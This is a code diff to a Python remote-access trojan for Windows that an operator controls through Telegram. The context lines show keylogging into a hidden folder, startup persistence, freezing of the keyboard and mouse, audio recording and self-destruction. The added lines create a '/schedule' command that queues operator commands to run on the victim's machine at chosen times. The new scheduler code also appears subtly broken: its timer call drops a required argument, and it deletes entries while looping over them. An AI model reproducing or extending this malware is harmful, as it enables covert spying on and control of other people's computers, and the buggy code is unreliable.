@@ -7,8 +7,9 @@ from winshell import startup 						# persistence
 from tendo import singleton							# this makes the application exit if there's another instance already running
 from win32com.client import Dispatch				# used for WScript.Shell
 from time import strftime, sleep					
+import datetime										# /schedule
 import time
-import threading 									#used for proxy
+import threading 									# /proxy, /schedule
 import proxy
 import pyaudio, wave 								# /hear
 import telepot, requests 							# telepot => telegram, requests => file download
@@ -45,6 +46,7 @@ initi = False
 keyboardFrozen = False
 mouseFrozen = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
+schedule = {}
 log_file = hide_folder + '\\keylogs.txt'
 hookManager = pyHook.HookManager()
 # functionalities dictionary: command:arguments
@@ -71,7 +73,12 @@ functionalities = { '/arp' : '', \
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
-	
+def runStackedSchedule(everyNSeconds):
+	for k in schedule.keys():
+		if k < datetime.datetime.now():
+			handle(schedule[k])
+			del schedule[k]
+	threading.Timer(everyNSeconds, runStackedSchedule).start()
 def internalIP():
 	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	internal_ip.connect(('google.com', 0))
@@ -288,7 +295,17 @@ def handle(msg):
 							response = 'File ' + path_file + ' has been run from hide_folder'
 						except:
 							response = 'File not found'
-					
+			elif command.startswith('/schedule'):
+				command = command.replace('/schedule', '')
+				if command == '':
+					response = '/schedule 2017 12 24 23 59 /msg_box happy christmas'
+				else:
+					scheduleDateTimeStr = command[1:command.index('/') - 1]
+					scheduleDateTime = datetime.datetime.strptime(scheduleDateTimeStr, '%Y %m %d %H %M')
+					scheduleMessage = command[command.index('/'):]
+					schedule[scheduleDateTime] = {'text' : scheduleMessage, 'chat' : { 'id' : chat_id }}
+					response = 'Schedule set: ' + scheduleMessage
+					runStackedSchedule(10)
 			elif command == '/self_destruct':
 				bot.sendChatAction(chat_id, 'typing')
 				global initi
